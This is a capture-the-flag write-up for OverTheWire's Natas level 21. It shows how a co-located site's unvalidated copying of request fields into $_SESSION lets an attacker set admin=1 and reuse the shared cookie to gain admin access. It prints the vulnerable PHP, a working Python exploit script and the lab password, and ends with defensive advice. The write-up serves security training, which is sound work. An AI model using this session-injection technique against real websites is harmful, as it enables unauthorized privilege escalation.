---
category: natas
title: Natas21 - Session Management Part 4
---

website: http://natas21.natas.labs.overthewire.org/ (password: IFekPyrQXftziDEsUr3x21sYuahypdgJ)

This challenge is similar to the one in Level 20 except that there is no way to manipulate `$SESSION` via the website itself. However, the webpage says "this website is colocated with http://natas21-experimenter.natas.labs.overthewire.org", which is a hint that the two websites may share the same session. If that's the case, then let's check if the other website is vulnerable to any attack.

Here is the code snippet of the second website:

```php
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
        $_SESSION[$key] = $val;
    }
}
```

As shown above, this website will take any key/value pairs from the request and save them into session variables without any input validation. As such, we can first send a request to the co-located website. In the request, we inject `$_SESSION[admin]=1` to acquire a cookie from that website. We then use that cookie to access the main website to retrieve the password. The following attack turns out to be a success:

```python
#!/usr/bin/env python3
 
from time import sleep
import requests
from requests.auth import HTTPBasicAuth
 
s = requests.Session()
s.auth = HTTPBasicAuth("natas21", "IFekPyrQXftziDEsUr3x21sYuahypdgJ")
url1 = 'http://natas21.natas.labs.overthewire.org/'
url2 = 'http://natas21-experimenter.natas.labs.overthewire.org/index.php?debug'
 
resp = s.post(url2, data={
              "align": "center", "fontsize": "100%", "bgcolor": "yellow", "submit": "update", "admin": "1"})
print(resp.text)
 
sleep(1)
# reuse the previous cookie
resp = s.get(url1, cookies=s.cookies.get_dict())
print(resp.text)
```

<strong>CONCLUSION</strong>

This challenge is also an example of insecure session management. To overcome such an issue, one should take some steps to manage sessions securely:
- Input validation. Only valid input (e.g., a whitelist) can be accepted.
- Session validation. For a website that shares a session with other websites, session validations are needed.

